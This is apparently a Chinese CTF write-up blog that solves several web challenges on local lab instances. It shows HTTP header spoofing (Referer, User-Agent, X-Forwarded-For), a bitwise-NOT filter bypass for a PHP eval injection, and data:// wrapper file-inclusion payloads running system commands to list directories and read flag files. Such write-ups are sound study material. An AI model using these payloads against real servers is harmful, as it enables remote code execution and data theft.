<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/5.1.png" alt="1"></p>
<h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.1.png" alt="1"></p>
<p>用F12查看到Secret.php</p>
<p>访问Secret.php</p>
<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.2.png" alt="1"></p>
<p>用bp</p>
<p>header中添加上 <code>Referer:https://www.Sycsecret.com</code></p>
<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.4.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.3.png" alt="1"></p>
<p>修改 User-Agent 为<code>User-Agent: Syclover</code></p>
<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.5.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.6.png" alt="1"></p>
<p>127.0.0.1,所以我们可以利用<code>X-Forwarded-For</code>协议来伪造只需要在 header 添加 <code>X-Forwarded-For:127.0.0.1</code>，再次访问</p>
<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.7.png" alt="1"></p>
<h3 id="NSSCTF-hardrce"><a href="#NSSCTF-hardrce" class="headerlink" title="NSSCTF hardrce"></a>NSSCTF hardrce</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];<span class="comment">//对wllm内容进行限制，过滤掉一下的特殊字符</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>)) <span class="comment">//进行正则匹配，过滤掉大小写字母</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>); <span class="comment">//执行wllm，说明存在远程代码执行漏洞</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> 蔡总说：注意审题！！！</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.jyshare.com/compile/11/">php在线运行网站</a></p>
<p>取反符号 ‘ ~ ‘</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;ls /&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%8C%86%8C%8B%9A%92</span><br><span class="line">%93%8C%DF%D0</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> NoVic4说：不错哦小伙子，可你能拿到flag吗？bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr <span class="keyword">var</span></span><br></pre></td></tr></table></figure>

<p>继续</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;cat /flllllaaaaaaggggggg&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%8C%86%8C%8B%9A%92</span><br><span class="line">%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> NoVic4说：不错哦小伙子，可你能拿到flag吗？NSSCTF&#123;<span class="number">47638</span>a22-<span class="number">222</span>b-<span class="number">4171</span>-a5bd-<span class="number">890458</span>f414a7&#125;</span><br></pre></td></tr></table></figure>

<h3 id="第十六章-昆仑星途"><a href="#第十六章-昆仑星途" class="headerlink" title="第十六章 昆仑星途"></a>第十六章 昆仑星途</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&quot;.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>文件包含漏洞</p>
<p>使用 PHP 封装器</p>
<table>
<thead>
<tr>
<th>Wrapper</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td><code>php://input</code></td>
<td>读取 POST 数据，可执行代码</td>
</tr>
<tr>
<td><code>php://filter</code></td>
<td>数据流过滤，用于读取文件源码</td>
</tr>
<tr>
<td><code>php://memory</code> &#x2F; <code>php://temp</code></td>
<td>内存数据流</td>
</tr>
<tr>
<td><code>data://</code></td>
<td>数据 URI，可嵌入代码</td>
</tr>
<tr>
<td><code>expect://</code></td>
<td>执行系统命令（极少见）</td>
</tr>
</tbody></table>
<p>payload1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&quot;ls -la /&quot;); ?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">include($_GET[&#x27;file&#x27;] . &quot;.php&quot;); total 68 drwxr-xr-x 1 root root 4096 Sep 4 00:52 . drwxr-xr-x 1 root root 4096 Sep 4 00:52 .. lrwxrwxrwx 1 root root 7 May 12 19:25 bin -&gt; usr/bin drwxr-xr-x 2 root root 4096 May 12 19:25 boot drwxr-xr-x 5 root root 360 Sep 4 00:52 dev -rwxr-xr-x 1 root root 118 Aug 20 12:43 entrypoint.sh drwxr-xr-x 1 root root 4096 Sep 4 00:52 etc -rw-r--r-- 1 root root 45 Sep 4 00:52 flag-P9Mo56YCMkjhEzXSqnmPZ9sWCudQTs.txt drwxr-xr-x 2 root root 4096 May 12 19:25 home lrwxrwxrwx 1 root root 7 May 12 19:25 lib -&gt; usr/lib lrwxrwxrwx 1 root root 9 May 12 19:25 lib64 -&gt; usr/lib64 drwxr-xr-x 2 root root 4096 Aug 11 00:00 media drwxr-xr-x 2 root root 4096 Aug 11 00:00 mnt drwxr-xr-x 2 root root 4096 Aug 11 00:00 opt dr-xr-xr-x 441 root root 0 Sep 4 00:52 proc drwx------ 2 root root 4096 Aug 11 00:00 root drwxr-xr-x 1 root root 4096 Sep 4 00:52 run lrwxrwxrwx 1 root root 8 May 12 19:25 sbin -&gt; usr/sbin drwxr-xr-x 2 root root 4096 Aug 11 00:00 srv dr-xr-xr-x 13 root root 0 Aug 18 11:39 sys drwxrwxrwt 1 root root 4096 Sep 4 00:52 tmp drwxr-xr-x 1 root root 4096 Aug 11 00:00 usr drwxr-xr-x 1 root root 4096 Aug 12 22:26 var .php</span><br></pre></td></tr></table></figure>

<p>看到flag-P9Mo56YCMkjhEzXSqnmPZ9sWCudQTs.txt</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&quot;cat /flag-P9Mo56YCMkjhEzXSqnmPZ9sWCudQTs.txt&quot;); ?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="第四章-金曦破禁与七绝傀儡阵"><a href="#第四章-金曦破禁与七绝傀儡阵" class="headerlink" title="第四章 金曦破禁与七绝傀儡阵"></a>第四章 金曦破禁与七绝傀儡阵</h3><p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.0.png" alt="1"></p>
<p>抓包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /stone_golem HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:61709</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>使用GET方法传递参数 key&#x3D;xdsec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /stone_golem?key=xdsec HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:61709</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag1:bW9lY3Rme0Mw</span><br><span class="line">&lt;a href=&quot;/cloud_weaver&quot;&gt;前往第二关：织云傀儡&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.1.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /cloud_weaver HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:61709</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 60</span><br><span class="line"></span><br><span class="line">declaration=%E7%BB%87%E4%BA%91%E9%98%81%3D%E7%AC%AC%E4%B8%80</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag2: bjZyNDd1MTQ3  </span><br><span class="line"> &lt;a href=&quot;/shadow_stalker&quot;&gt;前往第三关：溯源傀儡&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.2.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GET /shadow_stalker HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:65093</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">X-Forwarded-For:127.0.0.1  </span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag3:MTBuNV95MHVy</span><br><span class="line">&lt;a href=&quot;/soul_discerner&quot;&gt;前往第四关：器灵傀儡&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.3.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /soul_discerner HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:65093</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: moe browser  </span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag4:X2g3N1BfbDN2</span><br><span class="line">&lt;a href=&quot;/heart_seal&quot;&gt;前往第五关：心印傀儡&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.4.png" alt="1"></p>
